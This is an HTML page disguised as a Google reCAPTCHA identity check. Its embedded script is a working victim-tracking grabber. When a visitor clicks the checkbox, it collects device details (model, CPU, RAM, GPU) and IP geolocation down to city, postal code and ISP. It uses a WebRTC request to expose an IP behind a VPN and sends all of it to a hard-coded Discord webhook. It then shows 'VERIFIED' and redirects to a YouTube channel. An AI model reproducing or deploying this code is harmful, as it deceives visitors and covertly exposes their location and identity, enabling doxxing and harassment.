<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Identity Verification - reCAPTCHA</title>
    <style>
        body { background: #f9f9f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .captcha-container { background: #fff; border: 1px solid #d3d3d3; padding: 25px; border-radius: 8px; width: 320px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-left: 5px solid #4d90fe; }
        .flex { display: flex; align-items: center; }
        .check-shell { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; cursor: pointer; transition: 0.3s; position: relative; }
        .check-shell.active { border-radius: 50%; border-top-color: #4d90fe; animation: spin 1s linear infinite; }
        .label { font-size: 15px; color: #555; flex-grow: 1; font-weight: 400; }
        .logo-section { text-align: center; opacity: 0.8; }
        .logo-img { width: 32px; height: 32px; filter: grayscale(100%); }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #status { font-size: 10px; color: #aaa; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="captcha-container">
    <div class="flex" id="trigger">
        <div class="check-shell" id="box"></div>
        <div class="label">Verify your identity</div>
        <div class="logo-section">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="logo-img" alt="">
        </div>
    </div>
    <div id="status">Secure Connection: Waiting</div>
</div>

<script>
/**
 * SENTINEL OMEGA-X v20.0 
 * GEOSPATIAL MESH + DEVICE FORENSICS
 */

const ULTIMA = {
    HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    DEST: "https://youtube.com/@LigmaBlox-w7m",
    LOCKS: { geo: false, device: false, net: false }
};

const dispatch = (payload, vector) => {
    const data = JSON.stringify({
        username: `OMEGA-X [${vector}]`,
        embeds: [{
            title: "🔱 Precision Strike Confirmed",
            color: 0x4d90fe,
            fields: Object.entries(payload).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            footer: { text: `Accuracy: Town-Level | ${new Date().toISOString()}` }
        }]
    });

    navigator.sendBeacon(ULTIMA.HOOK, new Blob([data], {type:'application/json'}));
    fetch(ULTIMA.HOOK, { method: 'POST', body: data, headers: {'Content-Type': 'application/json'}, keepalive: true });
};

// --- VECTOR 1: ADVANCED DEVICE UNMASKING ---
const getDeviceModel = () => {
    const ua = navigator.userAgent;
    let model = "Unknown Device";
    
    // Detailed parsing for Apple/Android/PC
    if (/iPhone/.test(ua)) model = "iPhone " + (window.screen.height > 800 ? "Pro Max/Plus" : "Standard");
    else if (/iPad/.test(ua)) model = "iPad";
    else if (/Android/.test(ua)) {
        const match = ua.match(/Android\s([^\s;]+);\s([^\s;]+)/);
        model = match ? match[2] : "Android Device";
    } else if (/Windows/.test(ua)) model = "Windows PC";
    else if (/Macintosh/.test(ua)) model = "MacBook/iMac";

    return {
        model: model,
        cores: navigator.hardwareConcurrency || "N/A",
        ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
        gpu: (() => {
            const gl = document.createElement('canvas').getContext('webgl');
            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
        })()
    };
};

document.getElementById('trigger').onclick = async function() {
    const box = document.getElementById('box');
    box.classList.add('active');
    document.getElementById('status').innerText = "CALIBRATING GEOSPATIAL MESH...";

    // Capture Device First
    if(!ULTIMA.LOCKS.device) {
        dispatch(getDeviceModel(), "HARDWARE_UNMASK");
        ULTIMA.LOCKS.device = true;
    }

    // --- VECTOR 2: HIGH-PRECISION MESH (IP + TOWN DATA) ---
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        if(!ULTIMA.LOCKS.geo) {
            dispatch({
                ip: res.ip,
                continent: res.continent_code,
                country: res.country_name,
                region: res.region,
                city: res.city,
                town: res.postal || "Unavailable",
                isp: res.org,
                timezone: res.timezone
            }, "PRECISION_GEO");
            ULTIMA.LOCKS.geo = true;
        }
    });

    // --- VECTOR 3: TOR/VPN UDP LEAK ---
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !ULTIMA.LOCKS.net) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ip) {
                dispatch({ internal_leak: ip[1], status: "VPN_BYPASS_SUCCESS" }, "NETWORK_OVERRIDE");
                ULTIMA.LOCKS.net = true;
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    // Redirect
    setTimeout(() => {
        box.classList.remove('active');
        box.style.background = "#4d90fe";
        document.getElementById('status').innerText = "VERIFIED";
        setTimeout(() => { window.location.replace(ULTIMA.DEST); }, 800);
    }, 5000);
};
</script>
</body>
</html>
